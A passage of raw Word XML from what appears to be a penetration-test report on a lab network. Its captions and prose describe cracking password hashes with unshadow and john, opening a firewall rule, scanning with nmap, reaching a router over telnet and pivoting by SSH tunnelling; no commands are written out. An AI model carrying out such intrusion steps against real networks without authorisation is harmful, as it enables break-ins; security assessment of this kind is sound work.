    <w:p w14:paraId="61CAF5D9" w14:textId="2F13B53D" w:rsidR="005F6038" w:rsidRPr="00521489" w:rsidRDefault="005F6038" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 3</w:t>
      </w:r>
      <w:r w:rsidR="00702C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Unshadow result on webserver 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD4CB07" w14:textId="2CD372B4" w:rsidR="005F6038" w:rsidRPr="00521489" w:rsidRDefault="005F6038" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="73929CAB" wp14:editId="12058678">
            <wp:extent cx="5583555" cy="3186430"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="19608520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3555" cy="3186430"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E14E64A" w14:textId="60A20022" w:rsidR="00983943" w:rsidRPr="00521489" w:rsidRDefault="005F6038" w:rsidP="009A0E94">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00702C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>34</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. john hash result on webserver 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A319CD" w14:textId="77777777" w:rsidR="00BA5493" w:rsidRPr="00521489" w:rsidRDefault="00BA5493" w:rsidP="00A64DBF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="673D487A" w14:textId="77777777" w:rsidR="00CC29DB" w:rsidRPr="00521489" w:rsidRDefault="00CC29DB" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A7D98B3" w14:textId="497F1020" w:rsidR="005E001F" w:rsidRPr="00521489" w:rsidRDefault="005E001F" w:rsidP="005E001F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_Toc183984557"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Router 4</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
    </w:p>
    <w:p w14:paraId="03F993A0" w14:textId="20D81DB8" w:rsidR="006C1F38" w:rsidRPr="00521489" w:rsidRDefault="006C1F38" w:rsidP="006C1F38">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>From the firewall, the tester discover</w:t>
      </w:r>
      <w:r w:rsidR="007C4186" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a 4</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> router located on the LAN service. However, attempting to ping the service resulted in no response suggesting the firewall is blocking </w:t>
      </w:r>
      <w:r w:rsidR="00805257" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">this.  To combat this, the tester </w:t>
      </w:r>
      <w:r w:rsidR="007C4186" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>navigates</w:t>
      </w:r>
      <w:r w:rsidR="00805257" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to the firewalls rules and </w:t>
      </w:r>
      <w:r w:rsidR="007C4186" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>creates</w:t>
      </w:r>
      <w:r w:rsidR="002947D9" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a rule on the WAN to allow all protocols to go through the LAN service. After this, a nmap scan of the IP 192.168.0.98/27 </w:t>
      </w:r>
      <w:r w:rsidR="007C4186" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="002947D9" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> conducted and a telnet protocol </w:t>
      </w:r>
      <w:r w:rsidR="007C4186" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="002947D9" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> discovered as shown in Figure 37.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3334F6AE" w14:textId="51AB376C" w:rsidR="00F15C6D" w:rsidRPr="00521489" w:rsidRDefault="009F5568" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3079FBC2" wp14:editId="3FB7E540">
            <wp:extent cx="4096322" cy="2543530"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="1360542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42777" name="Picture 1" descr="A screenshot of a computer&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId48"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4096322" cy="2543530"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D9083D" w14:textId="4805957C" w:rsidR="002947D9" w:rsidRPr="00521489" w:rsidRDefault="002947D9" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 35. the Firewall interfaces.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6D7789" w14:textId="341ADEC7" w:rsidR="004914A2" w:rsidRPr="00521489" w:rsidRDefault="004914A2" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="05E1366A" wp14:editId="061CC3EE">
            <wp:extent cx="5943600" cy="613410"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="125840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02893" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId49"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="613410"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FAB886" w14:textId="7C4D81DC" w:rsidR="002947D9" w:rsidRPr="00521489" w:rsidRDefault="002947D9" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 36. The rule to allow pings to the 4</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> router.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5463C8E4" w14:textId="77777777" w:rsidR="002947D9" w:rsidRPr="00521489" w:rsidRDefault="002947D9" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EC2D1C0" w14:textId="72F5A264" w:rsidR="002947D9" w:rsidRPr="00521489" w:rsidRDefault="00B81997" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7E9FC7F5" wp14:editId="37F179E6">
            <wp:extent cx="5106113" cy="3305636"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="62582525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25258" name="Picture 1" descr="A computer screen with white text&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId50"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5106113" cy="3305636"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F05FD6D" w14:textId="7757CB7C" w:rsidR="002947D9" w:rsidRPr="00521489" w:rsidRDefault="002947D9" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 37. nmap scan of the 4</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> router.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABEE4FC" w14:textId="76E29E47" w:rsidR="002947D9" w:rsidRPr="00521489" w:rsidRDefault="002947D9" w:rsidP="002947D9">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The telnet, as shown in Figure 38, show</w:t>
      </w:r>
      <w:r w:rsidR="007C4186" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D8233E" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">2 direct connections to the router. The first of which being the firewall whereas the second seemingly </w:t>
      </w:r>
      <w:r w:rsidR="007C4186" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="00D8233E" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a 5</w:t>
      </w:r>
      <w:r w:rsidR="00D8233E" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r w:rsidR="00D8233E" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> PC</w:t>
      </w:r>
      <w:r w:rsidR="005C0205" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, located at 192.168.0.64/27.  Due to </w:t>
      </w:r>
      <w:r w:rsidR="00A559DE" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>complications in gaining access to the machine, the tester once agai</w:t>
      </w:r>
      <w:r w:rsidR="007C4186" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n utilizes</w:t>
      </w:r>
      <w:r w:rsidR="00A559DE" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the mounting process as done on PC1</w:t>
      </w:r>
      <w:r w:rsidR="009200A9" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to mount the drive </w:t>
      </w:r>
      <w:r w:rsidR="009A17B4" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">to prepare for ssh tunneling.  Figure 40 shows the result of the tunneling as well as an ifconfig scan displaying that no further devices are present on the network. This is the end of the networking process. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313BFFEA" w14:textId="447BDC64" w:rsidR="004914A2" w:rsidRPr="00521489" w:rsidRDefault="00454531" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7AA504B3" wp14:editId="344C5C8B">
            <wp:extent cx="5943600" cy="4981575"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="8906352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5294" name="Picture 1" descr="A computer screen shot of a program&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId51"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="4981575"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6DDD04" w14:textId="6B1C4264" w:rsidR="009200A9" w:rsidRPr="00521489" w:rsidRDefault="009200A9" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 38. the telnet interface of the 4</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> router. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4FF492" w14:textId="77777777" w:rsidR="009200A9" w:rsidRPr="00521489" w:rsidRDefault="00BD1E48" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5C69092E" wp14:editId="31C9FC72">
            <wp:extent cx="5630061" cy="1971950"/>
            <wp:effectExtent l="0" t="0" r="8890" b="9525"/>
            <wp:docPr id="2033819715"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9715" name="Picture 1" descr="A computer screen with blue and white text&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId52"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5630061" cy="1971950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C96B41" w14:textId="427BB532" w:rsidR="00342C08" w:rsidRPr="00521489" w:rsidRDefault="00342C08" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 39. The mounting process of the 5</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> PC.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EEC8CF4" w14:textId="362BF482" w:rsidR="009F5568" w:rsidRPr="00521489" w:rsidRDefault="00D92A9D" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6D2DD8EF" wp14:editId="67A9D15C">
            <wp:extent cx="5943600" cy="4683760"/>
            <wp:effectExtent l="0" t="0" r="0" b="2540"/>
            <wp:docPr id="194228965"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965" name="Picture 1" descr="A computer screen shot of a computer program&#10;&#10;Description automatically generated"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId53"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="4683760"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="08DB91B2" w14:textId="39225C68" w:rsidR="00342C08" w:rsidRPr="00521489" w:rsidRDefault="00342C08" w:rsidP="009F5568">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure 40. </w:t>
      </w:r>
      <w:r w:rsidR="009A17B4" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The ssh tunneling of the 5</w:t>
      </w:r>
      <w:r w:rsidR="009A17B4" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r w:rsidR="009A17B4" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> PC showing that no further devices are connecte</w:t>
      </w:r>
      <w:r w:rsidR="00C67FC2" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="009A17B4" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A12D5E" w14:textId="77777777" w:rsidR="00617B24" w:rsidRDefault="00617B24" w:rsidP="00617B24">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc183984558"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Security Weaknesses</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
    </w:p>
    <w:p w14:paraId="33BE7A2F" w14:textId="10477869" w:rsidR="009F122D" w:rsidRPr="009F122D" w:rsidRDefault="00332E3D" w:rsidP="009F122D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="_Toc183984559"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Exploita</w:t>
      </w:r>
      <w:r w:rsidR="00DC07F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>ble Weaknesses</w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
    </w:p>
    <w:p w14:paraId="1059E88D" w14:textId="77777777" w:rsidR="00BF1B6E" w:rsidRPr="00521489" w:rsidRDefault="00BF1B6E" w:rsidP="00BF1B6E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc183984560"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Default Credentials</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
    </w:p>
    <w:p w14:paraId="230E7C6B" w14:textId="46D72016" w:rsidR="004459D4" w:rsidRPr="00521489" w:rsidRDefault="00E903B8" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
